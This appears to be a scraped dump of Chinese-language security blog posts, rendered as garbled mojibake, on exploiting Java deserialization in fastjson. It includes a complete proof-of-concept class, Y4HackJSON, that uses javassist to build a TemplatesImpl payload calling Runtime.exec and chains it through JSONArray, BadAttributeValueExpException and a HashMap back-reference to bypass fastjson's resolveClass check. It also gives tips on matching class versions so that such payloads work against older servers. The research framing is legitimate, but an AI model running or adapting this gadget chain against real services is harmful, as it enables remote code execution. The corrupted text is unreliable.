¹æ®è¯»åˆ°çš„bytesä¸­tcçš„æ•°æ®ç±»å‹åšä¸åŒçš„å¤„ç†å»æ¢å¤éƒ¨åˆ†å¯¹è±¡ 1234567891011121314151617181920212223242526272829303132333435363738394041424344switch (tc) &#123; case TC_NULL: return readNull(); case TC_REFERENCE: return readHandle(unshared); case TC_CLASS: return readClass(unshared); case TC_CLASSDESC: case TC_PROXYCLASSDESC: return readClassDesc(unshared); case TC_STRING: case TC_LONGSTRING: return checkResolve(readString(unshared)); case TC_ARRAY: return checkResolve(readArray(unshared)); case TC_ENUM: return checkResolve(readEnum(unshared)); case TC_OBJECT: return checkResolve(readOrdinaryObject(unshared)); case TC_EXCEPTION: IOException ex = readFatalException(); throw new WriteAbortedException(&quot;writing aborted&quot;, ex); case TC_BLOCKDATA: case TC_BLOCKDATALONG: if (oldMode) &#123; bin.setBlockDataMode(true); bin.peek(); // force header read throw new OptionalDataException( bin.currentBlockRemaining()); &#125; else &#123; throw new StreamCorruptedException( &quot;unexpected block data&quot;); &#125; case TC_ENDBLOCKDATA: if (oldMode) &#123; throw new OptionalDataException(true); &#125; else &#123; throw new StreamCorruptedException( &quot;unexpected end of block data&quot;); &#125; default: throw new StreamCorruptedException( String.format(&quot;invalid type code: %02X&quot;, tc)); &#125; å†å¾€åï¼Œè·³è¿‡ä¸€äº›ç»†èŠ‚è¿‡ç¨‹ï¼Œä¸Šé¢çš„ä¸åŒcaseä¸­å¤§éƒ¨åˆ†ç±»éƒ½ä¼šæœ€ç»ˆè°ƒç”¨readClassDescå»è·å–ç±»çš„æè¿°ç¬¦ï¼Œåœ¨è¿™ä¸ªè¿‡ç¨‹ä¸­å¦‚æœå½“å‰ååºåˆ—åŒ–æ•°æ®ä¸‹ä¸€ä½ä»ç„¶æ˜¯TC_CLASSDESCé‚£ä¹ˆå°±ä¼šåœ¨readNonProxyDescä¸­è§¦å‘resolveClass å†å›åˆ°ä¸Šé¢è¿™ä¸ªswitchåˆ†æ”¯çš„ä»£ç ï¼Œä¸ä¼šè°ƒç”¨readClassDescçš„åˆ†æ”¯æœ‰TC_NULLã€TC_REFERENCEã€TC_STRINGã€TC_LONGSTRINGã€TC_EXCEPTIONï¼Œstringä¸nullè¿™ç§å¯¹æˆ‘ä»¬æ¯«æ— ç”¨å¤„çš„ï¼Œexceptionç±»å‹åˆ™æ˜¯è§£å†³åºåˆ—åŒ–ç»ˆæ­¢ç›¸å…³ï¼Œè¿™ä¸€ç‚¹å¯ä»¥ä»å…¶æè¿°çœ‹å‡º é‚£ä¹ˆå°±åªå‰©ä¸‹äº†referenceå¼•ç”¨ç±»å‹äº† å¦‚ä½•åˆ©ç”¨å¼•ç”¨ç±»å‹ç°åœ¨æˆ‘ä»¬å°±è¦æ€è€ƒï¼Œå¦‚ä½•åœ¨JSONArray/JSONObjectå¯¹è±¡ååºåˆ—åŒ–æ¢å¤å¯¹è±¡æ—¶ï¼Œè®©æˆ‘ä»¬çš„æ¶æ„ç±»æˆä¸ºå¼•ç”¨ç±»å‹ä»è€Œç»•è¿‡resolveClassçš„æ£€æŸ¥ ç­”æ¡ˆæ˜¯å½“å‘Listã€setã€mapç±»å‹ä¸­æ·»åŠ åŒæ ·å¯¹è±¡æ—¶å³å¯æˆåŠŸåˆ©ç”¨ï¼Œè¿™é‡Œä¹Ÿç®€å•æä¸€ä¸‹ï¼Œè¿™é‡Œä»¥Listä¸ºä¾‹ï¼Œ 1234ArrayList&lt;Object&gt; arrayList = new ArrayList&lt;&gt;();arrayList.add(templates);arrayList.add(templates);writeObjects(arrayList); å½“æˆ‘ä»¬å†™å…¥å¯¹è±¡æ—¶ï¼Œä¼šåœ¨handlesè¿™ä¸ªå“ˆå¸Œè¡¨ä¸­å»ºç«‹ä»å¯¹è±¡åˆ°å¼•ç”¨çš„æ˜ å°„ å½“å†æ¬¡å†™å…¥åŒä¸€å¯¹è±¡æ—¶ï¼Œåœ¨handlesè¿™ä¸ªhashè¡¨ä¸­æŸ¥åˆ°äº†æ˜ å°„ é‚£ä¹ˆå°±ä¼šé€šè¿‡writeHandleå°†é‡å¤å¯¹è±¡ä»¥å¼•ç”¨ç±»å‹å†™å…¥ å› æ­¤æˆ‘ä»¬å°±å¯ä»¥åˆ©ç”¨è¿™ä¸ªæ€è·¯æ„å»ºæ”»å‡»çš„payloadäº†ï¼Œè¿™é‡Œç®€å•ä»¥ä¼ªä»£ç å‘ˆç°ï¼Œä¾¿äºç†è§£æ€è·¯ 1234567891011TemplatesImpl templates = TemplatesImplUtil.getEvilClass(&quot;open -na Calculator&quot;);ArrayList&lt;Object&gt; arrayList = new ArrayList&lt;&gt;();arrayList.add(templates);JSONArray jsonArray = new JSONArray();jsonArray.add(templates);BadAttributeValueExpException bd = getBadAttributeValueExpException(jsonArray);arrayList.add(bd); WriteObjects(arrayList); ç®€å•æ¢³ç†ä¸‹ åºåˆ—åŒ–æ—¶ï¼Œåœ¨è¿™é‡Œtemplateså…ˆåŠ å…¥åˆ°arrayListä¸­ï¼Œåé¢åœ¨JSONArrayä¸­å†æ¬¡åºåˆ—åŒ–TemplatesImplæ—¶ï¼Œç”±äºåœ¨handlesè¿™ä¸ªhashè¡¨ä¸­æŸ¥åˆ°äº†æ˜ å°„ï¼Œåç»­åˆ™ä¼šä»¥å¼•ç”¨å½¢å¼è¾“å‡º ååºåˆ—åŒ–æ—¶ArrayListå…ˆé€šè¿‡readObjectæ¢å¤TemplatesImplå¯¹è±¡ï¼Œä¹‹åæ¢å¤BadAttributeValueExpExceptionå¯¹è±¡ï¼Œåœ¨æ¢å¤è¿‡ç¨‹ä¸­ï¼Œç”±äºBadAttributeValueExpExceptionè¦æ¢å¤valå¯¹åº”çš„JSONArray/JSONObjectå¯¹è±¡ï¼Œä¼šè§¦å‘JSONArray/JSONObjectçš„readObjectæ–¹æ³•ï¼Œå°†è¿™ä¸ªè¿‡ç¨‹å§”æ‰˜ç»™SecureObjectInputStreamï¼Œåœ¨æ¢å¤JSONArray/JSONObjectä¸­çš„TemplatesImplå¯¹è±¡æ—¶ï¼Œç”±äºæ­¤æ—¶çš„ç¬¬äºŒä¸ªTemplatesImplå¯¹è±¡æ˜¯å¼•ç”¨ç±»å‹ï¼Œé€šè¿‡readHandleæ¢å¤å¯¹è±¡çš„é€”ä¸­ä¸ä¼šè§¦å‘resolveClassï¼Œç”±æ­¤å®ç°äº†ç»•è¿‡ å½“ç„¶å‰é¢ä¹Ÿæåˆ°äº†ä¸ä»…ä»…æ˜¯Listï¼ŒSetä¸Mapç±»å‹éƒ½èƒ½æˆåŠŸè§¦å‘å¼•ç”¨ç»•è¿‡ã€‚ å®Œæ•´åˆ©ç”¨è‡³æ­¤fastjsonå…¨ç‰ˆæœ¬å®ç°äº†åŸç”Ÿååºåˆ—åŒ–åˆ©ç”¨ ä»£ç æµ‹è¯•ä¾èµ– 12345678910&lt;dependency&gt; &lt;groupId&gt;com.alibaba&lt;/groupId&gt; &lt;artifactId&gt;fastjson&lt;/artifactId&gt; &lt;version&gt;1.2.83&lt;/version&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;org.javassist&lt;/groupId&gt; &lt;artifactId&gt;javassist&lt;/artifactId&gt; &lt;version&gt;3.27.0-GA&lt;/version&gt;&lt;/dependency&gt; æµ‹è¯•ä»£ç ä»¥HashMapä¸ºä¾‹ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061import com.alibaba.fastjson.JSONArray;import javax.management.BadAttributeValueExpException;import java.io.*;import java.lang.reflect.Field;import java.util.HashMap;import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;import javassist.ClassPool;import javassist.CtClass;import javassist.CtConstructor;import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;public class Y4HackJSON &#123; public static void setValue(Object obj, String name, Object value) throws Exception&#123; Field field = obj.getClass().getDeclaredField(name); field.setAccessible(true); field.set(obj, value); &#125; public static byte[] genPayload(String cmd) throws Exception&#123; ClassPool pool = ClassPool.getDefault(); CtClass clazz = pool.makeClass(&quot;a&quot;); CtClass superClass = pool.get(AbstractTranslet.class.getName()); clazz.setSuperclass(superClass); CtConstructor constructor = new CtConstructor(new CtClass[]&#123;&#125;, clazz); constructor.setBody(&quot;Runtime.getRuntime().exec(\\&quot;&quot;+cmd+&quot;\\&quot;);&quot;); clazz.addConstructor(constructor); clazz.getClassFile().setMajorVersion(49); return clazz.toBytecode(); &#125; public static void main(String[] args) throws Exception&#123; TemplatesImpl templates = TemplatesImpl.class.newInstance(); setValue(templates, &quot;_bytecodes&quot;, new byte[][]&#123;genPayload(&quot;open -na Calculator&quot;)&#125;); setValue(templates, &quot;_name&quot;, &quot;1&quot;); setValue(templates, &quot;_tfactory&quot;, null); JSONArray jsonArray = new JSONArray(); jsonArray.add(templates); BadAttributeValueExpException bd = new BadAttributeValueExpException(null); setValue(bd,&quot;val&quot;,jsonArray); HashMap hashMap = new HashMap(); hashMap.put(templates,bd); ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream(); ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream); objectOutputStream.writeObject(hashMap); objectOutputStream.close(); ObjectInputStream objectInputStream = new ObjectInputStream(new ByteArrayInputStream(byteArrayOutputStream.toByteArray())); objectInputStream.readObject(); &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://y4tacker.github.io/categories/Java/"}],"tags":[{"name":"Java","slug":"Java","permalink":"https://y4tacker.github.io/tags/Java/"},{"name":"Fastjson","slug":"Fastjson","permalink":"https://y4tacker.github.io/tags/Fastjson/"}]},{"title":"åˆ©ç”¨TemplatesImplæ‰§è¡Œå­—èŠ‚ç åœ¨å®æˆ˜ä¸­çš„è¸©å‘è®°å½•","slug":"year/2023/4/åˆ©ç”¨TemplatesImplæ‰§è¡Œå­—èŠ‚ç åœ¨å®æˆ˜ä¸­çš„è¸©å‘è®°å½•","date":"2023-04-25T14:24:57.000Z","updated":"2024-08-04T09:01:49.909Z","comments":true,"path":"2023/04/25/year/2023/4/åˆ©ç”¨TemplatesImplæ‰§è¡Œå­—èŠ‚ç åœ¨å®æˆ˜ä¸­çš„è¸©å‘è®°å½•/","link":"","permalink":"https://y4tacker.github.io/2023/04/25/year/2023/4/%E5%88%A9%E7%94%A8TemplatesImpl%E6%89%A7%E8%A1%8C%E5%AD%97%E8%8A%82%E7%A0%81%E5%9C%A8%E5%AE%9E%E6%88%98%E4%B8%AD%E7%9A%84%E8%B8%A9%E5%9D%91%E8%AE%B0%E5%BD%95/","excerpt":"","text":"åˆ©ç”¨TemplatesImplæ‰§è¡Œå­—èŠ‚ç åœ¨å®æˆ˜ä¸­çš„è¸©å‘è®°å½•åœ¨å¹³æ—¶ï¼Œæ— è®ºæ˜¯JNDIæ³¨å…¥ï¼Œè¿˜æ˜¯ååºåˆ—åŒ–ï¼Œåªè¦æ¶‰åŠåˆ°ä¸å‡ºç½‘çš„åœºæ™¯ï¼ŒTemplatesImplçš„åˆ©ç”¨å°±å¾ˆå¹¿æ³›ï¼Œè¿™é‡Œè®°å½•ä¸€ä¸ªåœ¨å®æˆ˜ä¸­é‡åˆ°çš„è¸©å‘è®°å½•ï¼Œç¯‡å¹…ä¸å¤šè´µåœ¨è®°å½•ã€‚ å‡è®¾å½“å‰æœåŠ¡å™¨å­˜åœ¨ååºåˆ—åŒ–æ¼æ´ï¼Œä¸å‡ºç½‘ï¼Œå½“ä½ å…´é«˜é‡‡çƒˆçš„æ‹¿ç€å·¥å…·å»æ‰“çš„æ—¶å€™å‘ç°æ€ä¹ˆä¹Ÿæ‰“ä¸é€šï¼Œå†…å­˜é©¬ä¸Šä¸å»ï¼Œå›æ˜¾ä¹Ÿæ²¡æœ‰ï¼Œè¿™æ˜¯æ€ä¹ˆå›äº‹å‘¢ï¼Ÿä¸”çœ‹ä¸‹æ–‡ã€‚ æ—¢ç„¶éœ€è¦ä½¿ç”¨TemplatesImplåŠ è½½å­—èŠ‚ç ï¼Œé‚£ä¹ˆå°±éœ€è¦ç”Ÿæˆæ¶æ„ç±»çš„Bytecode è¿™é‡Œæˆ‘ä»¬å†æ¸©ä¹ ä¸€ä¸‹ï¼Œæœ€ç»ˆåœ¨getTransletInstanceæ–¹æ³•å¤„åŠ è½½å­—èŠ‚ç åˆ°jvmï¼Œå¹¶è°ƒç”¨newInstanceå®ä¾‹åŒ–è§¦å‘æ¶æ„ä»£ç çš„åŠ è½½ ç½‘ä¸Šçš„å„ç§å·¥å…·ï¼ŒåŸºæœ¬ä¸Šéƒ½ä½¿ç”¨äº†javassistæ¡†æ¶è¿›è¡Œæ¶æ„ç±»çš„ç”Ÿæˆï¼Œè¿™é‡Œä»¥TomcatEchoä¸ºä¾‹ï¼Œå¤§å¤šæ•°å·¥å…·ä»£ç éƒ½ç±»ä¼¼ä¸‹é¢çš„å†™æ³•ï¼Œåˆ›å»ºç±»ï¼Œæ·»åŠ æ–¹æ³•ï¼Œç”ŸæˆByteCode é—®é¢˜å°±å‡ºåœ¨è¾“å‡ºByteCodeçš„è¿‡ç¨‹ä¸­ï¼Œå½“è°ƒç”¨ClassPool.getDefault()çš„è¿‡ç¨‹ä¸­ï¼Œä¼šåˆå§‹åŒ–ClassFileï¼Œæ ¹æ®æŸäº›ä¸åŒç‰ˆæœ¬ç‰¹å®šå­˜åœ¨çš„ç±»æ¥åˆ¤æ–­å½“å‰ç¯å¢ƒçš„MAJOR_VERSION(Ps:è¿™é‡Œçš„åç¼–è¯‘æœ‰ç‚¹é—®é¢˜ï¼Œä»ä¸Šåˆ°ä¸‹verå…¶å®æ˜¯ä¾æ¬¡ä»49åˆ°55)ï¼Œè¿™ä¸ªMAJOR_VERSIONå…¶å®å°±æ˜¯æˆ‘ä»¬javaçš„ä¸»ç‰ˆæœ¬å·ä»49-55åˆ†åˆ«ä¸ºjdk1.5åˆ°jdk11 å› æ­¤è¿™å°±å¾ˆæœ‰æ„æ€äº†ï¼Œè¿™æ„å‘³ç€ä½¿ç”¨javassistç”Ÿæˆçš„å­—èŠ‚ç çš„å±æ€§ä¿¡æ¯å’Œå½“å‰javaè¿è¡Œç¯å¢ƒæœ‰å…³ å‡è®¾å½“å‰æœåŠ¡å™¨æ˜¯ä¸€ä¸ªjdk1.6è·‘ç€çš„tomcatæœåŠ¡ï¼Œä½ æ‹¿å·¥å…·æ‰“ï¼Œé‚£å¾ˆæ˜¾ç„¶jdk1.6å¹¶ä¸èƒ½è¿è¡Œ1.8ç‰ˆæœ¬ä¸‹ç¼–è¯‘çš„ç¨‹åºï¼Œé‚£æ€ä¹ˆåŠå‘¢ï¼Ÿå…¶å®å¾ˆç®€å•ä¿®æ”¹è¿™ä¸ªMAJOR_VERSIONå°±è¡Œï¼Œåªè¦è¿™ä¸ªå±æ€§çš„æ•°å€¼å°äºæˆ–ç­‰äºå½“å‰è¿è¡Œçš„javaç¯å¢ƒé‚£å°±èƒ½è¿‡æ£€æŸ¥å¹¶è¿è¡Œ è€Œjavassistæœ¬èº«ä¹Ÿæä¾›äº†å¯¹åº”çš„apiå»å¸®åŠ©æˆ‘ä»¬ä¿®æ”¹ï¼Œæ¯”å¦‚æˆ‘ä»¬éœ€è¦ç”Ÿæˆ1.6èƒ½è¿è¡Œçš„å­—èŠ‚ç ï¼Œæˆ‘ä»¬åªéœ€è¦åœ¨åŸæ¥çš„åŸºç¡€ä¸ŠåŠ ä¸Šclazz.getClassFile().setMajorVersion(50);å³å¯ é‚£å¦‚æœæ˜¯asmæ¡†æ¶æ€ä¹ˆåŠï¼Œå°±æ›´ç®€å•äº†ï¼Œåˆ›å»ºç±»çš„æ—¶å€™åœ¨ç¬¬ä¸€ä¸ªè¾“å…¥å†™ä¸Šå¯¹åº”ä¸»ç‰ˆæœ¬å·å³å¯","categories":[{"name":"Java","slug":"Java","permalink":"https://y4tacker.github.io/categories/Java/"}],"tags":[{"name":"Java","slug":"Java","permalink":"https://y4tacker.github.io/tags/Java/"},{"name":"TemplatesImpl","slug":"TemplatesImpl","permalink":"https://y4tacker.github.io/tags/TemplatesImpl/"},{"name":"è¸©å‘è®°å½•","slug":"è¸©å‘è®°å½•","permalink":"https://y4tacker.github.io/tags/%E8%B8%A9%E5%9D%91%E8%AE%B0%E5%BD%95/"}]},{"title":"FastJsonä¸åŸç”Ÿååºåˆ—åŒ–","slug":"year/2023/3/FastJsonä¸åŸç”Ÿååºåˆ—åŒ–","date":"2023-03-20T03:03:59.000Z","updated":"2024-08-04T09:01:49.895Z","comments":true,"path":"2023/03/20/year/2023/3/FastJsonä¸åŸç”Ÿååºåˆ—åŒ–/","link":"","permalink":"https://y4tacker.github.io/2023/03/20/year/2023/3/FastJson%E4%B8%8E%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/","excerpt":"","text":"FastJsonä¸åŸç”Ÿååºåˆ—åŒ–å‰è¨€è¿™å…¶å®æ˜¯æˆ‘å¾ˆæ—©å‰é‡åˆ°çš„ä¸€ä¸ªç§‹æ‹›é¢è¯•é¢˜ï¼Œé—®é¢˜å¤§æ¦‚æ˜¯å¦‚æœä½ é‡åˆ°ä¸€ä¸ªè¾ƒé«˜ç‰ˆæœ¬çš„FastJsonæœ‰ä»€ä¹ˆåŠæ³•èƒ½ç»•è¿‡AutoTypeä¹ˆï¼Ÿæˆ‘ä¸€å¼€å§‹å›ç­”çš„æ˜¯æ‰¾é»‘åå•å¤–çš„ç±»ï¼Œåé¢é¢è¯•å®˜è¯´æƒ³è€ƒå¯Ÿçš„æ˜¯FastJsonåœ¨åŸç”Ÿååºåˆ—åŒ–å½“ä¸­çš„åˆ©ç”¨ã€‚å› ä¸ºæ¯”è¾ƒæœ‰è¶£åŠ ä¸Šæœ€è¿‘åœ¨ç½‘ä¸Šä¹Ÿçœ‹åˆ°ç±»ä¼¼çš„ä¸œè¥¿ï¼Œä»Šå¤©ä¹Ÿå°±é¡ºä¾¿åœ¨è‚æ¯•è®¾ä¹‹ä½™æ¥è°ˆè°ˆè¿™ä¸ªé—®é¢˜ã€‚ åˆ©ç”¨ä¸é™åˆ¶Fastjson1ç‰ˆæœ¬å°äºç­‰äº1.2.48 Fastjson2ç›®å‰é€šæ€(ç›®å‰æœ€æ–°ç‰ˆæœ¬2.0.26) å¯»æ‰¾æ—¢ç„¶æ˜¯ä¸åŸç”Ÿååºåˆ—åŒ–ç›¸å…³ï¼Œé‚£æˆ‘ä»¬å»fastjsonåŒ…é‡Œå»çœ‹çœ‹å“ªäº›ç±»ç»§æ‰¿äº†Serializableæ¥å£å³å¯ï¼Œæœ€åæ‰¾å®Œåªæœ‰ä¸¤ä¸ªç±»ï¼ŒJSONArrayä¸JSONObjectï¼Œè¿™é‡Œæˆ‘ä»¬å°±æŒ‘ç¬¬ä¸€ä¸ªæ¥è®²(å®é™…ä¸Šè¿™ä¸¤ä¸ªåœ¨åŸç”Ÿååºåˆ—åŒ–å½“ä¸­åˆ©ç”¨æ–¹å¼æ˜¯ç›¸åŒçš„) é¦–å…ˆæˆ‘ä»¬å¯ä»¥åœ¨IDEAä¸­å¯ä»¥çœ‹åˆ°ï¼Œè™½ç„¶JSONArrayæœ‰implementè¿™ä¸ªSerializableæ¥å£ä½†æ˜¯å®ƒæœ¬èº«æ²¡æœ‰å®ç°readObjectæ–¹æ³•çš„é‡è½½ï¼Œå¹¶ä¸”ç»§æ‰¿çš„JSONç±»åŒæ ·æ²¡æœ‰readObjectæ–¹æ³•ï¼Œé‚£ä¹ˆåªæœ‰ä¸€ä¸ªæ€è·¯äº†ï¼Œé€šè¿‡å…¶ä»–ç±»çš„readObjectåšä¸­è½¬æ¥è§¦å‘JSONArrayæˆ–è€…JSONç±»å½“ä¸­çš„æŸä¸ªæ–¹æ³•æœ€ç»ˆå®ç°ä¸²é“¾ åœ¨Jsonç±»å½“ä¸­çš„toStringæ–¹æ³•èƒ½è§¦å‘toJsonStringçš„è°ƒç”¨ï¼Œè€Œè¿™ä¸ªä¸œè¥¿å…¶å®æˆ‘ä»¬å¹¶ä¸é™Œç”Ÿï¼Œåœ¨æˆ‘ä»¬æƒ³ç”¨JSON.parse()è§¦å‘getæ–¹æ³•æ—¶ï¼Œå…¶ä¸­ä¸€ä¸ªå¤„ç†æ–¹æ³•å°±æ˜¯ç”¨JSONObjectåµŒå¥—æˆ‘ä»¬çš„payload é‚£ä¹ˆæ€è·¯å°±å¾ˆæ˜ç¡®äº†ï¼Œè§¦å‘toString-&gt;toJSONString-&gt;getæ–¹æ³•ï¼Œ å¦‚ä½•è§¦å‘getteræ–¹æ³•è¿™é‡Œå¤šæä¸€å¥ä¸ºä»€ä¹ˆèƒ½è§¦å‘getæ–¹æ³•è°ƒç”¨ å› ä¸ºæ˜¯toStringæ‰€ä»¥è‚¯å®šä¼šæ¶‰åŠåˆ°å¯¹è±¡ä¸­çš„å±æ€§æå–ï¼Œfastjsonåœ¨åšè¿™éƒ¨åˆ†å®ç°æ—¶ï¼Œæ˜¯é€šè¿‡ObjectSerializerç±»çš„writeæ–¹æ³•å»åšçš„æå– è¿™éƒ¨åˆ†æµç¨‹æ˜¯å…ˆåˆ¤æ–­serializersè¿™ä¸ªHashMapå½“ä¸­æœ‰æ— é»˜è®¤æ˜ å°„ æˆ‘ä»¬å¯ä»¥æ¥çœ‹çœ‹æœ‰å“ªäº›é»˜è®¤çš„æ˜ å°„å…³ç³» 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849private void initSerializers() &#123; this.put((Type)Boolean.class, (ObjectSerializer)BooleanCodec.instance); this.put((Type)Character.class, (ObjectSerializer)CharacterCodec.instance); this.put((Type)Byte.class, (ObjectSerializer)IntegerCodec.instance); this.put((Type)Short.class, (ObjectSerializer)IntegerCodec.instance); this.put((Type)Integer.class, (ObjectSerializer)IntegerCodec.instance); this.put((Type)Long.class, (ObjectSerializer)LongCodec.instance); this.put((Type)Float.class, (ObjectSerializer)FloatCodec.instance); this.put((Type)Double.class, (ObjectSerializer)DoubleSerializer.instance); this.put((Type)BigDecimal.class, (ObjectSerializer)BigDecimalCodec.instance); this.put((Type)BigInteger.class, (ObjectSerializer)BigIntegerCodec.instance); this.put((Type)String.class, (ObjectSerializer)StringCodec.instance); this.put((Type)byte[].class, (ObjectSerializer)PrimitiveArraySerializer.instance); this.put((Type)short[].class, (ObjectSerializer)PrimitiveArraySerializer.instance); this.put((Type)int[].class, (ObjectSerializer)PrimitiveArraySerializer.instance); this.put((Type)long[].class, (ObjectSerializer)PrimitiveArraySerializer.instance); this.put((Type)float[].class, (ObjectSerializer)PrimitiveArraySerializer.instance); this.put((Type)double[].class, (ObjectSerializer)PrimitiveArraySerializer.instance); this.put((Type)boolean[].class, (ObjectSerializer)PrimitiveArraySerializer.instance); this.put((Type)char[].class, (ObjectSerializer)PrimitiveArraySerializer.instance); this.put((Type)Object[].class, (ObjectSerializer)ObjectArrayCodec.instance); this.put((Type)Class.class, (ObjectSerializer)MiscCodec.instance); this.put((Type)SimpleDateFormat.class, (ObjectSerializer)MiscCodec.instance); this.put((Type)Currency.class, (ObjectSerializer)(new MiscCodec())); this.put((Type)TimeZone.class, (ObjectSerializer)MiscCodec.instance); this.put((Type)InetAddress.class, (ObjectSerializer)MiscCodec.instance); this.put((Type)Inet4Address.class, (ObjectSerializer)MiscCodec.instance); this.put((Type)Inet6Address.class, (ObjectSerializer)MiscCodec.instance); this.put((Type)InetSocketAddress.class, (ObjectSerializer)MiscCodec.instance); this.put((Type)File.class, (ObjectSerializer)MiscCodec.instance); this.put((Type)Appendable.class, (ObjectSerializer)AppendableSerializer.instance); this.put((Type)StringBuffer.class, (ObjectSerializer)AppendableSerializer.instance); this.put((Type)StringBuilder.class, (ObjectSerializer)AppendableSerializer.instance); this.put((Type)Charset.class, (ObjectSerializer)ToStringSerializer.instance); this.put((Type)Pattern.class, (ObjectSerializer)ToStringSerializer.instance); this.put((Type)Locale.class, (ObjectSerializer)ToStringSerializer.instance); this.put((Type)URI.class, (ObjectSerializer)ToStringSerializer.instance); this.put((Type)URL.class, (ObjectSerializer)ToStringSerializer.instance); this.put((Type)UUID.class, (ObjectSerializer)ToStringSerializer.instance); this.put((Type)AtomicBoolean.class, (ObjectSerializer)AtomicCodec.instance); this.put((Type)AtomicInteger.class, (ObjectSerializer)AtomicCodec.instance); this.put((Type)AtomicLong.class, (ObjectSerializer)AtomicCodec.instance); this.put((Type)AtomicReference.class, (ObjectSerializer)ReferenceCodec.instance); this.put((Type)AtomicIntegerArray.class, (ObjectSerializer)AtomicCodec.instance); this.put((Type)AtomicLongArray.class, (ObjectSerializer)AtomicCodec.instance); this.put((Type)WeakReference.class, (ObjectSerializer)ReferenceCodec.instance); this.put((Type)SoftReference.class, (ObjectSerializer)ReferenceCodec.instance); this.put((Type)LinkedList.class, (ObjectSerializer)CollectionCodec.instance); &#125; è¿™é‡Œé¢åŸºæœ¬ä¸Šæ²¡æœ‰æˆ‘ä»¬éœ€è¦çš„ä¸œè¥¿ï¼Œå”¯ä¸€ç†Ÿæ‚‰çš„å°±æ˜¯MiscCodec(æç¤ºä¸‹æˆ‘ä»¬fastjsonåŠ è½½ä»»æ„classæ—¶å°±æ˜¯é€šè¿‡è°ƒç”¨è¿™ä¸ªçš„TypeUtils.loadClass)ï¼Œä½†å¯æƒœçš„æ˜¯ä»–çš„writeæ–¹æ³•åŒæ ·æ²¡æœ‰ä»€ä¹ˆå¯åˆ©ç”¨çš„ç‚¹ï¼Œå†å¾€ä¸‹å»é™¤ä¸€äº›ä¸å…³é”®çš„è°ƒç”¨æ ˆï¼Œæ¥ä¸‹æ¥é»˜è®¤ä¼šé€šè¿‡createJavaBeanSerializeræ¥åˆ›å»ºä¸€ä¸ªObjectSerializerå¯¹è±¡ å®ƒä¼šæå–ç±»å½“ä¸­çš„BeanInfoï¼ˆåŒ…æ‹¬æœ‰getteræ–¹æ³•çš„å±æ€§ï¼‰å¹¶ä¼ å…¥createJavaBeanSerializerç»§ç»­å¤„ç† 1234public final ObjectSerializer createJavaBeanSerializer(Class&lt;?&gt; clazz) &#123; SerializeBeanInfo beanInfo = TypeUtils.buildBeanInfo(clazz, (Map)null, this.propertyNamingStrategy, this.fieldBased); return (ObjectSerializer)(beanInfo.fields.length == 0 &amp;&amp; Iterable.class.isAssignableFrom(clazz) ? MiscCodec.instance : this.createJavaBeanSerializer(beanInfo));&#125; è¿™ä¸ªæ–¹æ³•ä¹Ÿæœ€ç»ˆä¼šå°†äºŒæ¬¡å¤„ç†çš„beaninfoç»§ç»­å§”æ‰˜ç»™createASMSerializeråšå¤„ç†ï¼Œè€Œè¿™ä¸ªæ–¹æ³•å…¶å®å°±æ˜¯é€šè¿‡ASMåŠ¨æ€åˆ›å»ºä¸€ä¸ªç±»(å› ä¸ºå’ŒJavaè‡ªå¸¦çš„ASMæ¡†æ¶é•¿çš„å¾ˆâ€œç›¸ä¼¼â€æ‰€ä»¥é˜…è¯»è¿™éƒ¨åˆ†ä»£ç å¹¶ä¸å¤æ‚) getteræ–¹æ³•çš„ç”Ÿæˆåœ¨com.alibaba.fastjson.serializer.ASMSerializerFactory#generateWriteMethodå½“ä¸­ å®ƒä¼šæ ¹æ®å­—æ®µçš„ç±»å‹è°ƒç”¨ä¸åŒçš„æ–¹æ³•å¤„ç†ï¼Œè¿™é‡Œæˆ‘ä»¬éšä¾¿çœ‹ä¸€ä¸ª(ä»¥ç¬¬ä¸€ä¸ª_longä¸ºä¾‹) é€šè¿‡_getæ–¹æ³•ç”Ÿæˆè¯»å–filedçš„æ–¹æ³• è¿™é‡Œçš„fieldInfoå…¶å®å°±æ˜¯æˆ‘ä»¬ä¸€å¼€å§‹çš„æœ‰getæ–¹æ³•çš„fieldçš„é›†åˆ 12345678910111213141516171819private void _get(MethodVisitor mw, ASMSerializerFactory.Context context, FieldInfo fieldInfo) &#123; Method method = fieldInfo.method; if (method != null) &#123; mw.visitVarInsn(25, context.var(&quot;entity&quot;)); Class&lt;?&gt; declaringClass = method.getDeclaringClass(); mw.visitMethodInsn(declaringClass.isInterface() ? 185 : 182, ASMUtils.type(declaringClass), method.getName(), ASMUtils.desc(method)); if (!method.getReturnType().equals(fieldInfo.fieldClass)) &#123; mw.visitTypeInsn(192, ASMUtils.type(fieldInfo.fieldClass)); &#125; &#125; else &#123; mw.visitVarInsn(25, context.var(&quot;entity&quot;)); Field field = fieldInfo.field; mw.visitFieldInsn(180, ASMUtils.type(fieldInfo.declaringClass), field.getName(), ASMUtils.desc(field.getType())); if (!field.getType().equals(fieldInfo.fieldClass)) &#123; mw.visitTypeInsn(192, ASMUtils.type(fieldInfo.fieldClass)); &#125; &#125; &#125; å› æ­¤èƒ½æœ€ç»ˆè°ƒç”¨æ–¹æ³•çš„getæ–¹æ³• è¿™é‡Œåšä¸ªéªŒè¯ï¼Œè¿™é‡Œæˆ‘ä»¬åˆ›å»ºä¸€ä¸ªUserç±»,å…¶ä¸­åªæœ‰usernameå­—æ®µæœ‰getæ–¹æ³• 12345678public class User &#123; public String username; public String password; public String getUsername() &#123; return username; &#125;&#125; åœ¨asmæœ€ç»ˆç”Ÿæˆcodeçš„bytesæ•°æ®å†™å…¥æ–‡ä»¶ å¯ä»¥çœ‹åˆ°åœ¨writeæ–¹æ³•å½“ä¸­passwordå› ä¸ºæ²¡æœ‰getæ–¹æ³•æ‰€ä»¥æ²¡æœ‰è°ƒç”¨getPasswordï¼Œè€Œusernameæœ‰æ‰€ä»¥è°ƒç”¨äº† 